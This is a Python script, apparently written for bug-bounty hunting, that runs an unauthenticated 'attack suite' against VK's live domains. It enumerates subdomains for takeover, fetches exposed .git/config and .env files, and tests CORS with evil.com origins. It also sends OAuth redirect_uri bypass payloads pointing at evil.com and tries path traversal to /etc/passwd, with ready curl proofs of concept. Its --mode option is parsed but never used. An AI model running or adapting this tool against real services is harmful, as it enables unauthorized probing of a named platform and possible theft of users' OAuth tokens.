#!/usr/bin/env python3
"""
VK Unauthenticated Attack Suite
================================
Tests VK targets WITHOUT requiring login credentials.

All attacks in this script are unauthenticated — no cookies, no tokens, no accounts needed.

Targets:
    - *.vkontakte.com
    - api.vk.com
    - oauth.vk.com
    - id.vk.com

Usage:
    python3 vk_unauth_attack.py
    python3 vk_unauth_attack.py --target vk.com
    python3 vk_unauth_attack.py --mode subdomain
    python3 vk_unauth_attack.py --mode api
    python3 vk_unauth_attack.py --mode cors
    python3 vk_unauth_attack.py --mode oauth
    python3 vk_unauth_attack.py --mode all
"""

import asyncio
import json
import re
import sys
import time
import socket
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Optional
from urllib.parse import urlencode, urlparse

import httpx


# ─── Configuration ─────────────────────────────────────────────────────────────
RATE_LIMIT_DELAY = 0.15  # 6 req/sec — safe under VK's 10/sec limit
TIMEOUT = 15.0

# VK domains to test
VK_DOMAINS = [
    "vk.com",
    "m.vk.com",
    "api.vk.com",
    "login.vk.com",
    "oauth.vk.com",
    "id.vk.com",
    "dev.vk.com",
    "platform.vk.com",
    "store.vk.com",
    "vkvideo.ru",
]

VK_SUBDOMAINS = [
    "www", "m", "api", "login", "oauth", "id", "dev", "platform", "store",
    "static", "cdn", "img", "video", "doc", "app", "admin", "internal",
    "test", "staging", "dev", "beta", "pre", "sandbox", "ci", "jenkins",
    "grafana", "kibana", "elasticsearch", "redis", "mysql", "postgres",
    "mongo", "rabbitmq", "kafka", "consul", "vault", "s3", "assets",
    "media", "upload", "files", "attachments", "photos", "documents",
    "im", "messages", "wall", "news", "feed", "search", "groups",
    "market", "ads", "pay", "billing", "support", "help", "docs",
    "blog", "forum", "wiki", "status", "notifications", "settings",
    "profile", "account", "auth", "sso", "saml", "oauth2", "oidc",
    "callback", "webhook", "hook", "event", "push", "socket", "ws",
    "realtime", "stream", "live", "broadcast", "cast", "mirror",
]


@dataclass
class AttackResult:
    """Result of an unauthenticated attack."""
    attack_type: str
    target: str
    vulnerable: bool
    severity: str
    title: str
    description: str
    evidence: str
    poc_curl: str
    bounty_potential: str
    category: str
    extra: dict = field(default_factory=dict)


class VKUnauthAttacker:
    """Unauthenticated VK attack suite."""

    def __init__(self, target: str = "vk.com"):
        self.target = target
        self.results: list[AttackResult] = []
        self.request_count = 0
        self.last_request_time = 0.0

    async def _rate_limit_wait(self):
        """Enforce rate limit."""
        elapsed = time.time() - self.last_request_time
        if elapsed < RATE_LIMIT_DELAY:
            await asyncio.sleep(RATE_LIMIT_DELAY - elapsed)
        self.last_request_time = time.time()
        self.request_count += 1

    async def _get(self, url: str, headers: dict = None, follow_redirects: bool = False, params: dict = None) -> tuple[int, dict, str]:
        """Make a GET request with rate limiting."""
        await self._rate_limit_wait()
        async with httpx.AsyncClient(timeout=TIMEOUT, follow_redirects=follow_redirects) as client:
            try:
                resp = await client.get(url, headers=headers or {}, params=params or {})
                return resp.status_code, dict(resp.headers), resp.text[:5000]
            except httpx.RequestError as e:
                return 0, {}, str(e)[:500]

    async def _options(self, url: str, headers: dict = None) -> tuple[int, dict, str]:
        """Make an OPTIONS request."""
        await self._rate_limit_wait()
        async with httpx.AsyncClient(timeout=TIMEOUT) as client:
            try:
                resp = await client.options(url, headers=headers or {})
                return resp.status_code, dict(resp.headers), resp.text[:2000]
            except httpx.RequestError as e:
                return 0, {}, str(e)[:500]


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK 1: Subdomain Enumeration & Takeover Detection
# ═══════════════════════════════════════════════════════════════════════════════

async def attack_subdomain_takeover(attacker: VKUnauthAttacker) -> list[AttackResult]:
    """Enumerate subdomains and check for takeover opportunities."""
    results = []

    print(f"\n🔍 ATTACK 1: Subdomain Enumeration & Takeover Detection")
    print(f"{'─'*70}")

    # DNS resolution check for each subdomain
    for subdomain in VK_SUBDOMAINS[:30]:  # Test first 30
        domain = f"{subdomain}.{attacker.target}"
        await attacker._rate_limit_wait()

        try:
            # Check if subdomain resolves
            ip = socket.gethostbyname(domain)

            # Check for common takeover fingerprints
            status, headers, body = await attacker._get(f"https://{domain}/")

            takeover_indicators = {
                "There isn't a GitHub Pages site here": "GitHub Pages",
                "NoSuchBucket": "AWS S3",
                "No such app": "Heroku",
                "404 Web Site not found": "Azure App Service",
                "Fastly error: unknown domain": "Fastly CDN",
                "project not found": "GitLab Pages",
                "Repository not found": "GitHub",
                "No Data": "Heroku (no data)",
                "Domain not found": "Cloudflare",
                "Site not found": "Weebly",
                "If this is your website": "Unconfigured hosting",
            }

            for indicator, platform in takeover_indicators.items():
                if indicator.lower() in body.lower():
                    results.append(AttackResult(
                        attack_type="subdomain_takeover",
                        target=domain,
                        vulnerable=True,
                        severity="HIGH",
                        title=f"Subdomain Takeover — {platform} ({domain})",
                        description=f"Subdomain {domain} points to {platform} but is not configured. Attacker can claim it.",
                        evidence=f"IP: {ip}, Indicator: '{indicator}'",
                        poc_curl=f"curl -s https://{domain}/ | grep '{indicator}'",
                        bounty_potential="HIGH",
                        category="subdomain_takeover",
                        extra={"platform": platform, "ip": ip},
                    ))
                    print(f"  🔴 {domain} → {platform} (TAKEOVER POSSIBLE)")
                    break
            else:
                # Check for dangling CNAME
                try:
                    cname = socket.getaddrinfo(domain, None, socket.AF_INET)
                except socket.gaierror:
                    pass

        except socket.gaierror:
            # Subdomain doesn't resolve — possible dangling DNS
            pass

    # Check VK-specific subdomains for common misconfigurations
    check_paths = [
        "/.git/config",
        "/.env",
        "/.env.local",
        "/.env.production",
        "/robots.txt",
        "/sitemap.xml",
        "/.well-known/security.txt",
        "/security.txt",
        "/.well-known/openid-configuration",
    ]

    for subdomain in ["dev", "staging", "test", "admin", "internal", "api"]:
        domain = f"{subdomain}.{attacker.target}"
        for path in check_paths:
            status, headers, body = await attacker._get(f"https://{domain}{path}")

            if status == 200 and len(body) > 10:
                # Check if it's real content (not default 404)
                if not any(x in body.lower() for x in ["404", "not found", "error", "default"]):
                    results.append(AttackResult(
                        attack_type="info_disclosure",
                        target=f"{domain}{path}",
                        vulnerable=True,
                        severity="MEDIUM" if ".git" in path or ".env" in path else "LOW",
                        title=f"Exposed File: {path} on {domain}",
                        description=f"Found accessible {path} on {domain}",
                        evidence=f"Status: {status}, Body: {body[:200]}",
                        poc_curl=f"curl -s https://{domain}{path}",
                        bounty_potential="MEDIUM",
                        category="info_disclosure",
                    ))
                    print(f"  🟡 {domain}{path} — Accessible")

    return results


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK 2: Public API Enumeration & Info Disclosure
# ═══════════════════════════════════════════════════════════════════════════════

async def attack_api_enumeration(attacker: VKUnauthAttacker) -> list[AttackResult]:
    """Enumerate public VK API endpoints and check for info disclosure."""
    results = []

    print(f"\n🔍 ATTACK 2: Public API Enumeration & Info Disclosure")
    print(f"{'─'*70}")

    # VK public API methods (no auth required)
    public_methods = [
        {"method": "users.get", "params": {"user_ids": "1", "fields": "photo_200"}},
        {"method": "users.getOnline", "params": {"online": "1"}},
        {"method": "wall.get", "params": {"owner_id": "1", "count": "1"}},
        {"method": "groups.getById", "params": {"group_id": "1"}},
        {"method": "database.getCountries", "params": {"count": "1"}},
        {"method": "database.getCities", "params": {"country_id": "1", "count": "1"}},
        {"method": "database.getUniversities", "params": {"count": "1"}},
        {"method": "database.getSchools", "params": {"count": "1"}},
        {"method": "database.getSchoolClasses", "params": {}},
        {"method": "utils.resolveScreenName", "params": {"screen_name": "durov"}},
        {"method": "utils.getServerTime", "params": {}},
        {"method": "utils.getLongLink", "params": {"url": "https://vk.com"}},
    ]

    for api_method in public_methods:
        status, headers, body = await attacker._get(
            f"https://api.vk.com/method/{api_method['method']}",
            params=api_method["params"]
        )

        # Check for version disclosure
        version_headers = {k: v for k, v in headers.items() if "version" in k.lower()}
        if version_headers:
            results.append(AttackResult(
                attack_type="info_disclosure",
                target="api.vk.com",
                vulnerable=False,
                severity="INFO",
                title=f"Version Disclosure: {api_method['method']}",
                description=f"API method exposes version information in headers",
                evidence=f"Headers: {version_headers}",
                poc_curl=f"curl -I 'https://api.vk.com/method/{api_method['method']}'",
                bounty_potential="LOW",
                category="info_disclosure",
            ))

        # Check for verbose error messages
        try:
            data = json.loads(body)
            if "error" in data:
                error = data["error"]
                error_msg = error.get("error_msg", "")

                # Check for internal details in error
                internal_indicators = ["stack", "trace", "internal", "debug", "sql", "database"]
                for indicator in internal_indicators:
                    if indicator in error_msg.lower():
                        results.append(AttackResult(
                            attack_type="info_disclosure",
                            target="api.vk.com",
                            vulnerable=True,
                            severity="MEDIUM",
                            title=f"Verbose Error: {api_method['method']}",
                            description=f"API returns internal details in error message",
                            evidence=f"Error: {error_msg}",
                            poc_curl=f"curl 'https://api.vk.com/method/{api_method['method']}'",
                            bounty_potential="MEDIUM",
                            category="info_disclosure",
                        ))
                        print(f"  🟡 Verbose error in {api_method['method']}")
                        break
        except json.JSONDecodeError:
            pass

        # Check response headers for interesting info
        interesting_headers = [
            "x-powered-by", "server", "x-debug", "x-trace",
            "x-request-id", "x-ratelimit", "x-api-version",
        ]

        for header in interesting_headers:
            if header in headers:
                value = headers[header]
                if value and len(value) > 0:
                    results.append(AttackResult(
                        attack_type="info_disclosure",
                        target="api.vk.com",
                        vulnerable=False,
                        severity="INFO",
                        title=f"Header Disclosure: {header}",
                        description=f"API exposes {header} header",
                        evidence=f"{header}: {value}",
                        poc_curl=f"curl -sI 'https://api.vk.com/method/{api_method['method']}' | grep -i {header}",
                        bounty_potential="LOW",
                        category="info_disclosure",
                    ))

    # Check for GraphQL endpoint
    status, headers, body = await attacker._get("https://api.vk.com/graphql")
    if status in (200, 400, 405) and "graphql" in body.lower():
        results.append(AttackResult(
            attack_type="api_discovery",
            target="api.vk.com",
            vulnerable=False,
            severity="INFO",
            title="GraphQL Endpoint Found",
            description="VK API has a GraphQL endpoint that may expose schema",
            evidence=f"Status: {status}, Body: {body[:200]}",
            poc_curl="curl 'https://api.vk.com/graphql' -d '{__schema{types{name}}}'",
            bounty_potential="MEDIUM",
            category="api_discovery",
        ))
        print(f"  🟡 GraphQL endpoint discovered")

    return results


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK 3: CORS Testing Without Authentication
# ═══════════════════════════════════════════════════════════════════════════════

async def attack_cors_unauth(attacker: VKUnauthAttacker) -> list[AttackResult]:
    """Test CORS configuration without authentication."""
    results = []

    print(f"\n🔍 ATTACK 3: CORS Testing (Unauthenticated)")
    print(f"{'─'*70}")

    test_origins = [
        "https://evil.com",
        "https://attacker.com",
        "null",
        "https://evil.vk.com",
        "https://vk.com.evil.com",
    ]

    endpoints = [
        "https://api.vk.com/method/users.get?user_ids=1",
        "https://oauth.vk.com/authorize?client_id=1&redirect_uri=https://example.com&response_type=token",
        "https://id.vk.com/",
        "https://vk.com/",
    ]

    for endpoint in endpoints:
        for origin in test_origins:
            headers = {
                "Origin": origin,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            }

            status, resp_headers, body = await attacker._get(endpoint, headers=headers)

            acao = resp_headers.get("access-control-allow-origin", "")
            acac = resp_headers.get("access-control-allow-credentials", "")

            # Check for vulnerability
            if acao == origin and acac.lower() == "true":
                results.append(AttackResult(
                    attack_type="cors_misconfiguration",
                    target=endpoint,
                    vulnerable=True,
                    severity="CRITICAL",
                    title=f"CORS with Credentials: {endpoint}",
                    description=f"Origin '{origin}' reflected with Access-Control-Allow-Credentials: true",
                    evidence=f"ACAO: {acao}, ACAC: {acac}",
                    poc_curl=f"curl -I -H 'Origin: {origin}' '{endpoint}'",
                    bounty_potential="MAX",
                    category="cors",
                ))
                print(f"  🔴 CRITICAL: {endpoint} accepts {origin} with credentials!")
            elif acao == origin:
                results.append(AttackResult(
                    attack_type="cors_misconfiguration",
                    target=endpoint,
                    vulnerable=True,
                    severity="MEDIUM",
                    title=f"CORS Origin Reflected: {endpoint}",
                    description=f"Origin '{origin}' reflected in ACAO header",
                    evidence=f"ACAO: {acao}",
                    poc_curl=f"curl -I -H 'Origin: {origin}' '{endpoint}'",
                    bounty_potential="MEDIUM",
                    category="cors",
                ))
                print(f"  🟡 MEDIUM: {endpoint} reflects {origin}")
            elif acao == "*":
                pass  # Wildcard is normal for public APIs

    return results


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK 4: OAuth Flow Testing (No Login Required)
# ═══════════════════════════════════════════════════════════════════════════════

async def attack_oauth_unauth(attacker: VKUnauthAttacker) -> list[AttackResult]:
    """Test OAuth flow without authentication."""
    results = []

    print(f"\n🔍 ATTACK 4: OAuth Flow Testing (Unauthenticated)")
    print(f"{'─'*70}")

    oauth_endpoints = [
        "https://oauth.vk.com/authorize",
        "https://id.vk.com/oauth2",
    ]

    redirect_uri_payloads = [
        "https://evil.com/callback",
        "https://evil.com",
        "https://evil.vk.com/callback",
        "https://vk.com.evil.com/callback",
        "//evil.com/callback",
        "https://evil.com%00.vk.com",
        "https://evil.com#@vk.com",
    ]

    for endpoint in oauth_endpoints:
        for redirect_uri in redirect_uri_payloads:
            params = {
                "client_id": "1",
                "redirect_uri": redirect_uri,
                "response_type": "token",
                "v": "5.131",
            }

            url = f"{endpoint}?{urlencode(params)}"
            status, headers, body = await attacker._get(url, follow_redirects=False)

            location = headers.get("location", "")

            # Check if evil domain is in redirect
            if "evil.com" in location:
                results.append(AttackResult(
                    attack_type="oauth_redirect_bypass",
                    target=endpoint,
                    vulnerable=True,
                    severity="CRITICAL",
                    title=f"OAuth Redirect URI Bypass: {endpoint}",
                    description=f"OAuth flow redirects to attacker-controlled domain",
                    evidence=f"Location: {location}",
                    poc_curl=f"curl -v '{url}'",
                    bounty_potential="MAX",
                    category="auth_bypass",
                ))
                print(f"  🔴 CRITICAL: {endpoint} redirects to {redirect_uri}")
            elif status == 200 and "evil.com" in body:
                results.append(AttackResult(
                    attack_type="oauth_redirect_reflection",
                    target=endpoint,
                    vulnerable=True,
                    severity="HIGH",
                    title=f"OAuth Redirect URI Reflected: {endpoint}",
                    description=f"Malicious redirect_uri reflected in page content",
                    evidence=f"Body contains evil.com reference",
                    poc_curl=f"curl '{url}'",
                    bounty_potential="HIGH",
                    category="open_redirect",
                ))
                print(f"  🟠 HIGH: {endpoint} reflects redirect_uri")

        # Test state parameter requirement
        params_no_state = {
            "client_id": "1",
            "redirect_uri": "https://example.com/callback",
            "response_type": "token",
            "v": "5.131",
        }

        url = f"{endpoint}?{urlencode(params_no_state)}"
        status, headers, body = await attacker._get(url)

        if status == 200 and "state" not in body.lower():
            results.append(AttackResult(
                attack_type="oauth_missing_state",
                target=endpoint,
                vulnerable=True,
                severity="MEDIUM",
                title=f"OAuth Missing State Parameter: {endpoint}",
                description=f"OAuth flow does not enforce state parameter, enabling CSRF",
                evidence=f"Status: {status}, No state error in response",
                poc_curl=f"curl '{url}'",
                bounty_potential="MEDIUM",
                category="csrf",
            ))
            print(f"  🟡 MEDIUM: {endpoint} accepts missing state")

    return results


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK 5: Error-Based Info Disclosure
# ═══════════════════════════════════════════════════════════════════════════════

async def attack_error_disclosure(attacker: VKUnauthAttacker) -> list[AttackResult]:
    """Trigger errors to extract internal information."""
    results = []

    print(f"\n🔍 ATTACK 5: Error-Based Information Disclosure")
    print(f"{'─'*70}")

    # Malformed requests to trigger verbose errors
    error_triggers = [
        {"url": "https://api.vk.com/method/", "desc": "Empty method"},
        {"url": "https://api.vk.com/method/nonexistent", "desc": "Invalid method"},
        {"url": "https://api.vk.com/method/users.get?access_token=invalid", "desc": "Invalid token"},
        {"url": "https://api.vk.com/method/users.get?user_ids=abc", "desc": "Invalid user_id"},
        {"url": "https://api.vk.com/method/users.get?fields=<script>", "desc": "XSS in params"},
        {"url": "https://api.vk.com/method/users.get?fields=", "desc": "Empty fields"},
        {"url": "https://api.vk.com/../../../etc/passwd", "desc": "Path traversal"},
        {"url": "https://api.vk.com/%00", "desc": "Null byte"},
    ]

    for trigger in error_triggers:
        status, headers, body = await attacker._get(trigger["url"])

        # Check for internal information in response
        internal_patterns = [
            (r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", "Internal IP"),
            (r"(/[a-zA-Z0-9_/]+\.(?:py|js|php|rb|go))", "Internal path"),
            (r"(stack\s*trace)", "Stack trace"),
            (r"(debug)", "Debug info"),
            (r"(version\s*[:=]\s*[0-9])", "Version info"),
        ]

        for pattern, name in internal_patterns:
            matches = re.findall(pattern, body, re.IGNORECASE)
            if matches:
                results.append(AttackResult(
                    attack_type="error_disclosure",
                    target=trigger["url"],
                    vulnerable=True,
                    severity="MEDIUM",
                    title=f"Error Disclosure: {name} ({trigger['desc']})",
                    description=f"Error response contains {name}",
                    evidence=f"Matches: {matches[:5]}",
                    poc_curl=f"curl '{trigger['url']}'",
                    bounty_potential="MEDIUM",
                    category="info_disclosure",
                ))
                print(f"  🟡 {name} found in error response")
                break

    return results


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK 6: Rate Limiting & Security Controls
# ═══════════════════════════════════════════════════════════════════════════════

async def attack_rate_limit(attacker: VKUnauthAttacker) -> list[AttackResult]:
    """Test rate limiting and security controls."""
    results = []

    print(f"\n🔍 ATTACK 6: Rate Limiting & Security Controls")
    print(f"{'─'*70}")

    # Test 1: Rapid requests to check rate limiting
    print(f"  Testing rate limiting (10 rapid requests)...", end=" ", flush=True)

    rate_limit_triggered = False
    for i in range(10):
        status, headers, body = await attacker._get("https://api.vk.com/method/utils.getServerTime")
        if status == 429 or "rate" in body.lower() or "limit" in body.lower():
            rate_limit_triggered = True
            break
        # Don't wait between these specific requests (testing rate limit)
        await asyncio.sleep(0.05)

    if not rate_limit_triggered:
        results.append(AttackResult(
            attack_type="rate_limit_bypass",
            target="api.vk.com",
            vulnerable=True,
            severity="MEDIUM",
            title="Weak Rate Limiting on API",
            description="API does not enforce rate limits on unauthenticated requests",
            evidence="10 rapid requests completed without 429",
            poc_curl="for i in $(seq 1 10); do curl -s 'https://api.vk.com/method/utils.getServerTime' & done",
            bounty_potential="MEDIUM",
            category="rate_limit",
        ))
        print(f"🟡 No rate limit triggered")
    else:
        print(f"✅ Rate limit enforced")

    # Test 2: Check for security headers
    status, headers, body = await attacker._get("https://vk.com/")

    security_headers = [
        "strict-transport-security",
        "content-security-policy",
        "x-frame-options",
        "x-content-type-options",
        "x-xss-protection",
        "referrer-policy",
        "permissions-policy",
    ]

    missing_headers = []
    for header in security_headers:
        if header not in headers:
            missing_headers.append(header)

    if len(missing_headers) >= 3:
        results.append(AttackResult(
            attack_type="missing_security_headers",
            target="vk.com",
            vulnerable=False,
            severity="LOW",
            title=f"Missing Security Headers ({len(missing_headers)} missing)",
            description=f"VK is missing {len(missing_headers)} recommended security headers",
            evidence=f"Missing: {', '.join(missing_headers)}",
            poc_curl="curl -sI https://vk.com/ | grep -i 'strict-transport\\|content-security\\|x-frame'",
            bounty_potential="LOW",
            category="info_disclosure",
        ))
        print(f"  🟢 {len(missing_headers)} security headers missing")

    return results


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN RUNNER
# ═══════════════════════════════════════════════════════════════════════════════

class VKUnauthHuntRunner:
    """Master runner for unauthenticated VK attacks."""

    def __init__(self, target: str = "vk.com"):
        self.target = target
        self.results: list[AttackResult] = []
        self.start_time = None

    async def run_all(self) -> list[AttackResult]:
        """Run all unauthenticated attacks."""
        self.start_time = datetime.now()

        print(f"\n{'#'*70}")
        print(f"{'#'*70}")
        print(f"  VK UNAUTHENTICATED ATTACK SUITE")
        print(f"  Target: {self.target}")
        print(f"  Started: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  Mode: NO AUTHENTICATION REQUIRED")
        print(f"{'#'*70}")
        print(f"{'#'*70}")

        attacker = VKUnauthAttacker(self.target)

        # Run all attacks
        attacks = [
            ("Subdomain Takeover", attack_subdomain_takeover),
            ("API Enumeration", attack_api_enumeration),
            ("CORS Testing", attack_cors_unauth),
            ("OAuth Flow", attack_oauth_unauth),
            ("Error Disclosure", attack_error_disclosure),
            ("Rate Limiting", attack_rate_limit),
        ]

        for attack_name, attack_func in attacks:
            try:
                new_results = await attack_func(attacker)
                self.results.extend(new_results)
            except Exception as e:
                print(f"  ⚠️  Error in {attack_name}: {e}")

        self._print_summary()
        self._export_results()

        return self.results

    def _print_summary(self):
        """Print final summary."""
        end_time = datetime.now()
        duration = (end_time - self.start_time).total_seconds()

        critical = [r for r in self.results if r.severity == "CRITICAL"]
        high = [r for r in self.results if r.severity == "HIGH"]
        medium = [r for r in self.results if r.severity == "MEDIUM"]
        low = [r for r in self.results if r.severity in ("LOW", "INFO")]

        print(f"\n{'#'*70}")
        print(f"FINAL SUMMARY")
        print(f"{'#'*70}")
        print(f"Duration: {duration:.1f} seconds")
        print(f"Total Findings: {len(self.results)}")
        print(f"CRITICAL: {len(critical)} 🔴")
        print(f"HIGH:     {len(high)} 🟠")
        print(f"MEDIUM:   {len(medium)} 🟡")
        print(f"LOW/INFO: {len(low)} 🟢")

        if critical:
            print(f"\n🔴 CRITICAL FINDINGS:")
            for r in critical:
                print(f"  - {r.title}")
                print(f"    {r.poc_curl}")

        if high:
            print(f"\n🟠 HIGH FINDINGS:")
            for r in high:
                print(f"  - {r.title}")

        print(f"\n{'#'*70}")

    def _export_results(self):
        """Export results to JSON."""
        data = {
            "target": self.target,
            "timestamp": self.start_time.isoformat(),
            "summary": {
                "total": len(self.results),
                "critical": len([r for r in self.results if r.severity == "CRITICAL"]),
                "high": len([r for r in self.results if r.severity == "HIGH"]),
                "medium": len([r for r in self.results if r.severity == "MEDIUM"]),
                "low": len([r for r in self.results if r.severity in ("LOW", "INFO")]),
            },
            "results": [
                {
                    "attack_type": r.attack_type,
                    "target": r.target,
                    "vulnerable": r.vulnerable,
                    "severity": r.severity,
                    "title": r.title,
                    "description": r.description,
                    "evidence": r.evidence,
                    "poc_curl": r.poc_curl,
                    "bounty_potential": r.bounty_potential,
                    "category": r.category,
                }
                for r in self.results
            ],
        }

        with open("vk_unauth_results.json", "w") as f:
            json.dump(data, f, indent=2)
        print(f"\n📄 Results exported to: vk_unauth_results.json")


async def main():
    """Main entry point."""
    import argparse

    parser = argparse.ArgumentParser(description="VK Unauthenticated Attack Suite")
    parser.add_argument("--target", default="vk.com", help="Target domain")
    parser.add_argument("--mode", choices=["all", "subdomain", "api", "cors", "oauth", "error", "ratelimit"],
                       default="all", help="Attack mode")
    args = parser.parse_args()

    runner = VKUnauthHuntRunner(target=args.target)
    await runner.run_all()


if __name__ == "__main__":
    asyncio.run(main())
